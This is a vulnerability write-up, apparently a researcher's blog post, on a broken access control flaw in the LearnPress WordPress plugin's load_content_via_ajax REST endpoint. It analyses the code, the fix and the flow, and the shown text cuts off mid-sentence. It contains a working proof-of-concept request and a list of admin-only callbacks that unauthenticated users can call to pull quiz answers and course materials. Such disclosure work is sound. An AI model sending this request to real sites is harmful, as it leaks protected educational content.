&lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;LearnPress – WordPress LMS Plugin&lt;/strong&gt; for &lt;strong&gt;WordPress&lt;/strong&gt; contains a &lt;strong&gt;Sensitive Information Disclosure&lt;/strong&gt; vulnerability in all versions up to and including &lt;strong&gt;4.2.9.4&lt;/strong&gt;. The cause is the lack of &lt;strong&gt;capability checks&lt;/strong&gt; in the &lt;strong&gt;REST endpoint&lt;/strong&gt; &lt;strong&gt;/wp-json/lp/v1/load_content_via_ajax&lt;/strong&gt;, which allows execution of &lt;strong&gt;arbitrary callbacks&lt;/strong&gt; belonging to &lt;strong&gt;admin-only template methods&lt;/strong&gt;. This enables &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; to obtain &lt;strong&gt;admin curriculum HTML&lt;/strong&gt;, &lt;strong&gt;quiz questions with correct answers&lt;/strong&gt;, &lt;strong&gt;course materials&lt;/strong&gt;, and other &lt;strong&gt;sensitive educational content&lt;/strong&gt; via the &lt;strong&gt;REST API endpoint&lt;/strong&gt;, as long as they supply &lt;strong&gt;valid numeric IDs&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11368&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11368&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.2.9.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.3.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/learnpress/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LearnPress Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;LearnPress&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.2.9.4&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.3.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers a REST API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class LP_REST_AJAX_Controller extends LP_Abstract_REST_Controller {&#xA;&#x9;public function __construct() {&#xA;&#x9;&#x9;$this-&amp;gt;namespace = &amp;#39;lp/v1&amp;#39;;&#xA;&#x9;&#x9;$this-&amp;gt;rest_base = &amp;#39;load_content_via_ajax&amp;#39;;&#xA;&#xA;&#x9;&#x9;parent::__construct();&#xA;&#x9;}&#xA;&#xA;&#x9;public function register_routes() {&#xA;&#x9;&#x9;$this-&amp;gt;routes = array(&#xA;&#x9;&#x9;&#x9;&amp;#39;/&amp;#39; =&amp;gt; array(&#xA;&#x9;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::ALLMETHODS,&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;callback&amp;#39;            =&amp;gt; array( $this, &amp;#39;get_content&amp;#39; ),&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&amp;#39;permission_callback&amp;#39; =&amp;gt; &amp;#39;__return_true&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;&#x9;),&#xA;&#x9;&#x9;);&#xA;&#xA;&#x9;&#x9;parent::register_routes();&#xA;&#x9;}&#xA;  ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the code above, &lt;strong&gt;class LP_REST_AJAX_Controller&lt;/strong&gt; extends &lt;strong&gt;LP_Abstract_REST_Controller&lt;/strong&gt; and is used to register a &lt;strong&gt;REST API endpoint&lt;/strong&gt; for the &lt;strong&gt;LearnPress&lt;/strong&gt; plugin.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;__construct()&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Sets the &lt;strong&gt;namespace&lt;/strong&gt; to &lt;code&gt;lp/v1&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Sets the &lt;strong&gt;rest_base&lt;/strong&gt; to &lt;code&gt;load_content_via_ajax&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Calls &lt;strong&gt;parent::__construct()&lt;/strong&gt; to inherit the parent class setup.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;register_routes()&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Declares a route &lt;code&gt;/&lt;/code&gt; with the following:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;methods&lt;/strong&gt;: accepts all HTTP methods (&lt;strong&gt;WP_REST_Server::ALLMETHODS&lt;/strong&gt;).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;callback&lt;/strong&gt;: calls the &lt;code&gt;get_content&lt;/code&gt; function.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;permission_callback&lt;/strong&gt;: always returns &lt;code&gt;true&lt;/code&gt;, meaning &lt;strong&gt;no permission checks&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Calls &lt;strong&gt;parent::register_routes()&lt;/strong&gt; to complete registration.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function register_routes() {&#xA;  if ( ! $this-&amp;gt;routes ) {&#xA;    return;&#xA;  }&#xA;&#xA;  foreach ( $this-&amp;gt;routes as $key =&amp;gt; $args ) {&#xA;    $rest_base = $this-&amp;gt;rest_base;&#xA;    $override  = false;&#xA;&#xA;    if ( is_bool( end( $args ) ) ) {&#xA;      $override = array_pop( $args );&#xA;    }&#xA;&#xA;    if ( ! is_numeric( $key ) ) {&#xA;      $rest_base = &amp;#34;{$rest_base}/{$key}&amp;#34;;&#xA;    }&#xA;&#xA;    register_rest_route( $this-&amp;gt;namespace, &amp;#39;/&amp;#39; . $rest_base, $args, $override );&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thus, this API exposes the endpoint:&#xA;&lt;strong&gt;&lt;code&gt;/wp-json/lp/v1/load_content_via_ajax&lt;/code&gt;&lt;/strong&gt;,&#xA;and the &lt;code&gt;get_content&lt;/code&gt; callback will be invoked when receiving a request.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function get_content( WP_REST_Request $request ): LP_REST_Response {&#xA;  $response = new LP_REST_Response();&#xA;&#xA;  try {&#xA;    $params = $request-&amp;gt;get_params();&#xA;&#xA;    if ( empty( $params[&amp;#39;callback&amp;#39;] ) ||&#xA;      ! isset( $params[&amp;#39;args&amp;#39;] ) ) {&#xA;      throw new Exception( &amp;#39;Error: params invalid!&amp;#39; );&#xA;    }&#xA;&#xA;    // @var array $args&#xA;    $args     = $params[&amp;#39;args&amp;#39;];&#xA;    $callBack = $params[&amp;#39;callback&amp;#39;];&#xA;    if ( $request-&amp;gt;get_method() === &amp;#39;GET&amp;#39; ) {&#xA;      $args     = LP_Helper::json_decode( $params[&amp;#39;args&amp;#39;], true );&#xA;      $callBack = LP_Helper::json_decode( $params[&amp;#39;callback&amp;#39;], true );&#xA;    }&#xA;&#xA;    if ( empty( $callBack[&amp;#39;class&amp;#39;] ) ||&#xA;      empty( $callBack[&amp;#39;method&amp;#39;] ) ) {&#xA;      throw new Exception( &amp;#39;Error: callback invalid!&amp;#39; );&#xA;    }&#xA;&#xA;    $class  = $callBack[&amp;#39;class&amp;#39;];&#xA;    $method = $callBack[&amp;#39;method&amp;#39;];&#xA;    $data   = null;&#xA;&#xA;    // Security: check callback is registered.&#xA;    $allow_callbacks = apply_filters(&#xA;      &amp;#39;lp/rest/ajax/allow_callback&amp;#39;,&#xA;      []&#xA;    );&#xA;    $callBackStr     = $class . &amp;#39;:&amp;#39; . $method;&#xA;    if ( ! in_array( $callBackStr, $allow_callbacks ) ) {&#xA;      throw new Exception( &amp;#39;Error: callback is not register!&amp;#39; );&#xA;    }&#xA;&#xA;    // Check class and method is callable.&#xA;    if ( is_callable( [ $class, $method ] ) ) {&#xA;      $data = call_user_func( [ $class, $method ], $args );&#xA;    } else {&#xA;      throw new Exception( &amp;#39;Error: callback is not callable!&amp;#39; );&#xA;    }&#xA;&#xA;    if ( ! $data instanceof stdClass &amp;amp;&amp;amp; ! isset( $data-&amp;gt;content ) ) {&#xA;      throw new Exception( &amp;#39;Error: data content invalid!&amp;#39; );&#xA;    }&#xA;&#xA;    $response-&amp;gt;status  = &amp;#39;success&amp;#39;;&#xA;    $response-&amp;gt;message = &amp;#39;Success!&amp;#39;;&#xA;    $response-&amp;gt;data    = $data;&#xA;  } catch ( Throwable $e ) {&#xA;    $response-&amp;gt;status  = &amp;#39;error&amp;#39;;&#xA;    $response-&amp;gt;message = $e-&amp;gt;getMessage();&#xA;  }&#xA;&#xA;  return $response;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function receives &lt;code&gt;callback&lt;/code&gt; and &lt;code&gt;args&lt;/code&gt; from the request, decodes JSON if using GET, checks whether the callback contains both &lt;code&gt;class&lt;/code&gt; and &lt;code&gt;method&lt;/code&gt;, builds the string &lt;code&gt;class:method&lt;/code&gt; and checks it against the valid callbacks list from the filter; if present, checks if class–method is callable and executes &lt;code&gt;call_user_func&lt;/code&gt; with &lt;code&gt;$args&lt;/code&gt;, receives &lt;code&gt;$data&lt;/code&gt;, and returns it in the response.&lt;/p&gt;&#xA;&lt;p&gt;A series of callbacks are registered via &lt;code&gt;add_filter&lt;/code&gt; for &lt;code&gt;lp/rest/ajax/allow_callback&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-11-cve-2025-11368/filter.png&#34; title=&#34;Register callbacks for filter lp/rest/ajax/allow_callback&#34; data-thumbnail=&#34;/posts/2025-12-11-cve-2025-11368/filter.png&#34; data-sub-html=&#34;&lt;h2&gt;Filter&lt;/h2&gt;&lt;p&gt;Register callbacks for filter lp/rest/ajax/allow_callback&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-11-cve-2025-11368/filter.png&#39; alt=&#34;Filter&#34; height=&#34;948&#34; width=&#34;793&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Register callbacks for filter lp/rest/ajax/allow_callback&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function allow_callback( array $callbacks ): array {&#xA;  $callbacks[] = get_class( $this ) . &amp;#39;:render_edit_quiz&amp;#39;;&#xA;  $callbacks[] = get_class( $this ) . &amp;#39;:render_list_items_not_assign&amp;#39;;&#xA;&#xA;  return $callbacks;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function receives the existing &lt;code&gt;$callbacks&lt;/code&gt; array, adds two strings in the format &lt;code&gt;ClassName:method&lt;/code&gt;, and returns the array for WordPress to use as the allowed callback list. While debugging, all registered callbacks appear:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-11-cve-2025-11368/allow.png&#34; title=&#34;List of allowed callbacks&#34; data-thumbnail=&#34;/posts/2025-12-11-cve-2025-11368/allow.png&#34; data-sub-html=&#34;&lt;h2&gt;Allow&lt;/h2&gt;&lt;p&gt;List of allowed callbacks&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-11-cve-2025-11368/allow.png&#39; alt=&#34;Allow&#34; height=&#34;869&#34; width=&#34;955&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;List of allowed callbacks&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;The vulnerability arises because the API performs no capability or permission checks.&lt;/strong&gt;&#xA;This allows any user—including unauthenticated attackers—to call the endpoint and execute any callback from the registered callback list, even those intended for admin-only templates.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;The patch (v4.3.0)&lt;/strong&gt; adds a permission validation step in &lt;code&gt;get_content&lt;/code&gt; by checking the request’s &lt;code&gt;X-WP-Nonce&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! wp_verify_nonce( $request-&amp;gt;get_header( &amp;#39;X-WP-Nonce&amp;#39; ), &amp;#39;wp_rest&amp;#39; ) ) {&#xA;  throw new Exception( &amp;#39;Error: invalid nonce!&amp;#39; );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If the nonce is invalid or missing, the request is blocked immediately, preventing unauthorized users from accessing callbacks intended for admin.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-11-cve-2025-11368/diff.png&#34; title=&#34;Diff code&#34; data-thumbnail=&#34;/posts/2025-12-11-cve-2025-11368/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Diff code&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-11-cve-2025-11368/diff.png&#39; alt=&#34;Diff&#34; height=&#34;790&#34; width=&#34;1863&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Diff code&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Unauthenticated attacker&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Sends request to REST API: /wp-json/lp/v1/load_content_via_ajax&amp;#34;]&#xA;--&amp;gt; C[&amp;#34;Request includes callback (class &amp;#43; method) and args (lesson, quiz, material IDs...)&amp;#34;]&#xA;--&amp;gt; D[&amp;#34;API receives request → invokes get_content()&amp;#34;]&#xA;--&amp;gt; E[&amp;#34;permission_callback = __return_true → no capability checks&amp;#34;]&#xA;--&amp;gt; F[&amp;#34;get_content() validates params but performs no permission or capability validation&amp;#34;]&#xA;--&amp;gt; G[&amp;#34;Constructs class:method and verifies it against allowed callbacks via lp/rest/ajax/allow_callback&amp;#34;]&#xA;--&amp;gt; H[&amp;#34;Callback is valid but intended for admin-only template rendering&amp;#34;]&#xA;--&amp;gt; I[&amp;#34;API executes the method using call_user_func([class, method], args)&amp;#34;]&#xA;--&amp;gt; J[&amp;#34;Template method renders sensitive HTML such as curriculum, quiz content, answers, or course materials&amp;#34;]&#xA;--&amp;gt; K[&amp;#34;Sensitive data is returned to the attacker through the REST API&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Send a request as an unauthenticated user:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/lp/v1/load_content_via_ajax HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;callback[class]=LearnPress\TemplateHooks\Admin\AdminEditQizTemplate&amp;amp;callback[method]=render_list_items_not_assign&amp;amp;args[quiz_id]=483&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-11-cve-2025-11368/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-11-cve-2025-11368/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-11-cve-2025-11368/result.png&#39; alt=&#34;Result&#34; height=&#34;807&#34; width=&#34;1315&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;List of other allowed callbacks:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;LearnPress\TemplateHooks\Course\ListCoursesTemplate:render_courses&#xA;LearnPress\TemplateHooks\Course\ListCoursesRelatedTemplate:render_courses&#xA;LearnPress\TemplateHooks\Course\SingleCourseTemplate:render_html_comments&#xA;LearnPress\TemplateHooks\Profile\ProfileQuizzesTemplate:renderContent&#xA;LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_edit_course_curriculum&#xA;LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_list_items_not_assign&#xA;LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_edit_quiz&#xA;LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_list_items_not_assign&#xA;LearnPress\TemplateHooks\Admin\AdminEditQuestionTemplate:render_edit_question&#xA;LearnPress\TemplateHooks\Course\CourseMaterialTemplate:render_material_items&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesGrid:render_courses&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesList:render_courses&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesLoopItem:render_courses&#xA;LearnPress\Gutenberg\Blocks\Courses\ListCoursesBlockType:render_courses&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability stems from a REST API endpoint &lt;strong&gt;without access control&lt;/strong&gt;, allowing unauthenticated attackers to execute internal admin-only callbacks. Using valid IDs, attackers can extract &lt;strong&gt;curriculum&lt;/strong&gt;, &lt;strong&gt;quizzes&lt;/strong&gt;, &lt;strong&gt;answers&lt;/strong&gt;, and other &lt;strong&gt;sensitive course content&lt;/strong&gt;. The 4.3.0 patch resolves this by adding &lt;strong&gt;X-WP-Nonce&lt;/strong&gt; verification to prevent unauthorized access.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;permission_callback = __return_true&lt;/strong&gt; is the root cause of the Broken Access Control issue.&lt;/li&gt;&#xA;&lt;li&gt;Allowing execution of internal callbacks without permissions leads directly to &lt;strong&gt;sensitive data 